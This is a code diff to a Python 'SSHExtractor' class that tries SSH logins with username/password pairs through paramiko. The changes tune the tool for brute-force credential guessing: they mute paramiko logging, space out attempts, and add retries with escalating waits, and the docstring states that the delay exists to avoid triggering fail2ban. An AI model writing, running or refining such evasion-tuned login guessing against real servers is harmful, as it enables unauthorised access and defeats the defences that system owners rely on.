@@ -3,6 +3,8 @@
 import itertools
 import os
 import socket
+import logging
+logging.getLogger('paramiko').setLevel(logging.CRITICAL)
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
@@ -127,7 +129,9 @@ class SSHExtractor:
 
     def _test_credential(self, username: str, password: str) -> str:
         """Attempt SSH login with given credentials using paramiko.
-        Retries once after 10 seconds on connection failure.
+
+        Uses exponential backoff on rate limiting. Delays 3s between attempts
+        to avoid triggering fail2ban.
 
         Args:
             username (str): SSH username to test.
@@ -138,9 +142,10 @@ class SSHExtractor:
         """
         import paramiko
         import time
-        time.sleep(1.5)
 
-        for attempt in range(2):
+        time.sleep(3)
+
+        for attempt in range(3):
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             try:
@@ -149,7 +154,7 @@ class SSHExtractor:
                     port=self.port,
                     username=username,
                     password=password,
-                    timeout=5,
+                    timeout=10,
                     allow_agent=False,
                     look_for_keys=False,
                 )
@@ -157,12 +162,14 @@ class SSHExtractor:
                 return 'success'
             except paramiko.AuthenticationException:
                 return 'auth_failed'
-            except paramiko.ssh_exception.NoValidConnectionsError:
-                if attempt == 0:
-                    print(f"  [SSH] Rate limited — waiting 10s before retry...")
-                    time.sleep(10)
-                else:
-                    return 'no_connection'
+            except (paramiko.ssh_exception.NoValidConnectionsError,
+                    paramiko.ssh_exception.SSHException,
+                    ConnectionResetError,
+                    EOFError):
+                wait = 30 * (attempt + 1)
+                print(f"  [SSH] Rate limited — waiting {wait}s before retry...")
+                time.sleep(wait)
             except Exception as e:
                 return str(e)
+
         return 'no_connection'
